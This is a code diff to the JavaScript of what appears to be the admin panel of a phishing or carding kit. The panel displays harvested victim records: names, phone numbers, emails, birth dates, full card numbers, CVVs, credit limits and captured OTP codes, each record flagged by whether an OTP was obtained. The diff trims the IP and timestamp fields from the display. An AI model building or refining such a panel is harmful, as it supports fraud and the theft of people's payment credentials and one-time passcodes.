@@ -334,7 +334,7 @@ body{
       if(s.otp)badges.push('<span class="badge o">OTP</span>');else badges.push('<span class="badge miss">No OTP</span>');
       return '<div class="card glass" data-id="'+s._id+'">'+
         '<div class="card-head">'+
-          '<div class="card-title"><div class="name">User #'+(state.submissions.indexOf(s)+1)+': '+esc(name)+'</div><div class="meta">Mobile: '+esc(mob)+(s.updatedAt?' &middot; '+fmtDate(s.updatedAt):'')+'</div></div>'+
+          '<div class="card-title"><div class="name">User #'+(state.submissions.indexOf(s)+1)+': '+esc(name)+'</div><div class="meta">Mobile: '+esc(mob)+'</div></div>'+
           '<div style="display:flex;align-items:center;gap:10px"><div class="badges">'+badges.join('')+'</div><svg class="chev" width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"/></svg></div>'+
         '</div>'+
         '<div class="card-body">'+renderFields(s)+'</div>'+
@@ -352,7 +352,6 @@ body{
     rows.push(kv('Mobile',p.mobile));
     rows.push(kv('Email',p.email));
     rows.push(kv('DOB',p.dob));
-    rows.push(kv('IP (personal)',p.ip));
     var c=s.card||{};
     rows.push(kv('Card Holder',c.card_holder));
     rows.push(kv('Card Number',c.card_number));
@@ -360,12 +359,9 @@ body{
     rows.push(kv('CVV',c.card_cvv));
     rows.push(kv('Total Limit',c.total_limit));
     rows.push(kv('Available Limit',c.avail_limit));
-    rows.push(kv('IP (card)',c.ip));
     var o=s.otp||{};
     rows.push(kv('OTP',o.otp));
     rows.push(kv('IP (otp)',o.ip));
-    rows.push(kv('Submitted At',fmtDate(s.createdAt)));
-    rows.push(kv('Last Updated',fmtDate(s.updatedAt)));
     return '<div class="grid">'+rows.join('')+'</div>';
   }
   function kv(k,v){return '<div class="kv"><div class="k">'+esc(k)+'</div><div class="v">'+esc(v||'N/A')+'</div></div>';}
